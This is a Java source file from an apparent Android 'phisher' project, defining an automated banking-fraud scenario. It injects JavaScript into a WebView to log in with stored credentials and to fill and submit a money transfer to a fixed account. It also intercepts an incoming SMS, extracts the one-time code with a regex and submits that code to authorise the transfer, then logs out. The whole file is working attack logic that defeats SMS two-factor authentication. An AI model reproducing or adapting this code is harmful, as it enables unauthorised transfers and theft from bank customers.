package pl.jasiun.phisher.scenario;

import java.util.LinkedList;
import java.util.List;

import pl.jasiun.phisher.AndroidController;
import pl.jasiun.phisher.WebViewActivity;
import pl.jasiun.phisher.scenario.Step.Trigger;

public class Scenario {

	List<Step> steps;
	private int currentStepPossition;
	
	boolean isStated;
	private AndroidController controller;
	
	public Scenario(AndroidController controller) {
		this.controller = controller;
		this.currentStepPossition = 0;
		
				
		this.steps = new LinkedList<Step>();
		
		Step step1 = new Step(this, Trigger.PAGE_READY);
		step1.addAction(new JavascriptAction(controller,"javascript:$('#username').val(Android.load('username'));$('#password').val(Android.load('password'));$('form').submit();"));
		steps.add(step1);
		
		steps.add(new Step(this, Trigger.PAGE_READY));
		steps.add(new Step(this, Trigger.PAGE_READY));
		
		Step step2 = new Step(this, Trigger.PAGE_READY);
		step2.addAction(new JavascriptAction(controller,"javascript:window.location.href='1/transfer/form.html';"));
		steps.add(step2);

		steps.add(new Step(this, Trigger.PAGE_READY));
		Step step3 = new Step(this, Trigger.PAGE_READY);
		step3.addAction(new PrepareSmsReciverAction(controller,"46737494533","^[a-zA-Z0-9/, ]+:[0-9]+: ([a-zA-Z0-9]+).*"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('#id_recipient_account').val('123123');"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('#id_title').val('oplaty');"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('#id_recipient_name').val('Jan Kowalski');"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('#id_date').val('2012-12-21');"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('#id_value').val('1000');"));
		step3.addAction(new JavascriptAction(controller,"javascript:$('form').submit();"));
		steps.add(step3);
		
		Step step4 = new Step(this, Trigger.SMS_RECIVED_AND_PAGE_READY);
		step4.addAction(new JavascriptAction(controller,"javascript:$('#sms_code').val('[[sms_code]]'); $('form').submit();"));
		steps.add(step4);
		
		steps.add(new Step(this, Trigger.PAGE_READY));
		
		Step step5 = new Step(this, Trigger.PAGE_READY);
		step5.addAction(new JavascriptAction(controller,"javascript:window.location.href='/ebanking/logout/'"));
		steps.add(step5);
		
		
		
	}

	public void play() {
		isStated = true;
		this.currentStepPossition = 0;
		getCurrentStep().playIfReady();
	}

	public void pageLoaded() {
		getCurrentStep().pageLoaded();
	}

	public void smsReceived(String code) {
		getCurrentStep().smsReceived(code);
		
	}

	public void moveToNextStep() {
		
		++currentStepPossition;
		
		if(currentStepPossition == steps.size()) {
			currentStepPossition = 0;
			isStated = false;
		}
		
	}

	public Step getCurrentStep() {
		return steps.get(currentStepPossition);
	}

}
